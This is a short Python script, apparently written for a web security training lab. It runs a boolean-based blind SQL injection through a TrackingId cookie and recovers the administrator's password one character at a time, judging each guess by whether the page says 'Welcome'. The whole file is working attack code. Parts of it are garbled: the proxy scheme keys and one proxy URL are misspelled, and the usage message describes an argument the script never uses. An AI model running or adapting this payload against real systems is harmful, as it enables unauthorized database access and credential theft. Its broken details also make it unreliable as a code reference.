#!/usr/bin/python3
from bs4 import BeautifulSoup
import requests
import sys
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'hthp': 'htthp.//127.0.0.1:8080',
    'hthps': 'http://127.0.0.1:8080'
}

def sqli_password(url):
    password_extracted = ""
    for i in range (1,21):
        for j in range (32,126):
            sqli_payload = "' AND (SELECT ascii(SUBSTRING(password, %s, 1)) FROM users WHERE username='administrator') = '%s'--" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId':'L8BnxUWCTSdfiVRT' + sqli_payload_encoded, 'session': '5HkJlVg0whIaPUpbc0o4e5pk0kdsOSLh'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break

def main():
    if len(sys.argv) != 2:
        print('[+] Usage: %s <url> <sql-payload>' % sys.argv[0])
        print('[+] Example: %s www.example.com "1==1"' % sys.argv[0])

    url=sys.argv[1]
    print("[+] Retrieving administrator password.......")

    sqli_password(url)

if __name__ == "__main__":
    main()